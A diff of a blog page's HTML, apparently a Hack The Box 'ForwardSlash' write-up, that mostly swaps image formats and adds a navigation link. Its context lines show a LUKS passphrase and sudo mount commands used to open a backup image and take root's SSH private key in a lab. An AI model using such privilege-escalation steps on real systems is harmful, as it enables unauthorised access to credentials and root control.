-    <img data-src="/images/htb_forwardslash/forwardslash12.jpg" alt="main function snippet" data-caption="main function snippet" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash12.webp" alt="main function snippet" data-caption="main function snippet" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -2023,7 +2070,7 @@ Anyway I am just leaving this note here to say that we still have that backup si
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash13.jpg" alt="pain credentials leak" data-caption="pain credentials leak" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash13.webp" alt="pain credentials leak" data-caption="pain credentials leak" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -2045,7 +2092,7 @@ Anyway I am just leaving this note here to say that we still have that backup si
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash14.jpg" alt="sudo -l" data-caption="sudo -l" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash14.webp" alt="sudo -l" data-caption="sudo -l" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -2066,7 +2113,7 @@ Anyway I am just leaving this note here to say that we still have that backup si
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash15.jpg" alt="encrypter.py" data-caption="encrypter.py" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash15.webp" alt="encrypter.py" data-caption="encrypter.py" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -2087,7 +2134,7 @@ Anyway I am just leaving this note here to say that we still have that backup si
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash16.jpg" alt="decrypted message" data-caption="decrypted message" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash16.webp" alt="decrypted message" data-caption="decrypted message" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -2110,8 +2157,10 @@ Enter passphrase for encrypted_backup.img: cB!6%sdH8Lj^@Y*$C2cf<br />
 $ sudo /bin/mount /dev/mapper/backup ./mnt/<br />
 $ cd mnt</div>
 <p>The image contains <code>root</code> <em>SSH</em> private key <code>id_rsa</code>. We retrieve it, log in through <em>SSH</em> and get the root flag!</p>
+<hr />
 <h2 id="conclusion">Conclusion</h2>
 <p>This was quite a straightforward box, more on the <em>Medium</em> difficulty I would say. No insane enumeration to do so I completed it quite easily :) Except for the <em>LUKS</em> part, the concepts seen can be found in many other boxes.</p>
+<hr />
 <h2 id="resources">Resources</h2>
 <p>[1] XML External Entity (XXE) Processing<br />
 <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></p>
@@ -2463,6 +2512,13 @@ $ cd mnt</div>
     <div class="grow"></div>
 <nav class="pagination-single">
   
+    
+      <a href="https://noobintheshell.com/posts/htb_playertwo/" class="pagination-single__left">
+        <div class="pagination-single__icon">
+          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
+        </div>
+        <div class="pagination-single__left-title">Hack The Box :: PlayerTwo</div>      
+      </a>
     
     <div class="grow"></div>
     
